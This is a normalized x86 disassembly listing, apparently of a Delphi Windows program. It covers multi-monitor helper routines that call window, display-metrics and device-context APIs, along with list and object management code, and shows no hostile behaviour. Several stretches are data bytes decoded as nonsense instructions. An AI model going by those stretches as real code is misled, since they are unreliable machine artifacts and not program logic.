cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429b7e
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_429ab8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fe8
sub_429ba0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_429ab8
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_429c28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_429ab8
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_429cb8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_429ab8
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_429c28
sub_429d4e
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_429ab8
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_429dcf
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_429ab8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429ebc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_429ab8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429f90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_429ab8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a064
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_429ab8
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42a1ff
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42a225
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a22c
retn
sub_42a240
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a265
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a26c
retn
sub_42a360
unpckhps xmm1 [ ecx + 0x53 ]
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
lea eax [ eax ]
and [ edx + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add bh bh
dec [ ebp - 0x5bdfffc0 ]
inc edx
add [ eax ] al
add [ eax ] al
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
movsb [ edi ] [ esi ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
mov [ 0x40042 ] al
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
mov eax eax
and al 0xa3
inc edx
mov [ 0x66010042 ] al
xchg ebx eax
outsb
je r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
inc edx
outsb
dec eax
insb
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ ecx + esi * 2 + 0x40 ] ah
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b00b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
movsb [ edi ] [ esi ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
jno r-xdata
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xa2e47265
inc edx
add [ ecx ] al
xchg bx ax
jns r-xdata
add al al
dec edi
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
dec eax
insb
jo r-xdata
mov [ 0xc0f0042 ] eax
dec ecx
outsb
je r-xdata
add [ edi ] cl
or al 0x49
add bh bh
dec [ ebx + 0x42a3a0c0 ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40403c
add al 0x0
jo r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
jmp r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0x8400408d
movsb [ edi ] [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
add [ edi ] cl
outsb
je r-xdata
jo r-xdata
mov [ 0x150f0042 ] eax
dec ecx
push ebx
add bh bh
jmp [ eax - 0x5d ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b012
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a64
lea eax [ ebp - 0x8 ]
call sub_4058a8
retn
inc ebx
xor edi edi
dec ecx
imul esp [ ebp + 0x77 ] 0xa3207265
inc edx
add [ ecx ] al
xchg bx ax
cld
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
add [ eax ] cl
outsb
je r-xdata
adc ecx [ ecx + 0x45 ]
insd
dec esp
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
jae r-xdata
jo r-xdata
cmp cl [ ecx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add [ edi ] cl
add bh bh
dec [ ebx + 0x42a324c0 ]
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4297a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058c0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
dec esp
adc [ eax ] eax
add [ eax - 0x6d ] ebx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a26c
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
lodsd [ esi ]
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
imul esp [ ebp + 0x77 ] 0x114c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
jae r-xdata
adc eax 0x65705349
je r-xdata
dec [ ebx + 0x42a2b4c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
insd
dec eax
insb
jo r-xdata
sub_42a63c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42a6b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42a7c8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4058c0
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a6b9
lea eax [ ebp - 0x8 ]
call sub_4058a8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a754
mov [ rw-data ] eax
sub_42a6c0
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a754
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4058ec
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42a718
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4058c0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42a754
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov dl 0x1
mov eax [ r-xdata ]
call sub_429764
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429764
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429764
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403fe8
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42a7c8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42a8c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a718
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4297b4
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cfa0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cfa0
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a718
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4297b4
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a718
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4297b4
mov ecx r-xdata
call sub_4058ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a8d0
lea eax [ ebp - 0xc ]
call sub_4058a8
lea eax [ ebp - 0x8 ]
call sub_4058a8
retn
sub edx 0xfffffff8
sub_42a8e8
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_4297a0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42a928
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4297a0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42a958
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42aaea
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_4297a0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42aa85
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aaf1
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4297a0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
mov eax esi
xor edx edx
call sub_4297a0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4297a0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403270
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4297a0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42aaf8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42abdd
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_40403c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42abe4
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a64
lea eax [ ebp - 0x8 ]
call sub_4058a8
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4297a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058c0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4297a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058c0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42ae14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42af07
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_40403c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af0e
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a64
lea eax [ ebp - 0x10 ]
call sub_4058a8
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_4297a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4058c0
lea eax [ ebp - 0x14 ]
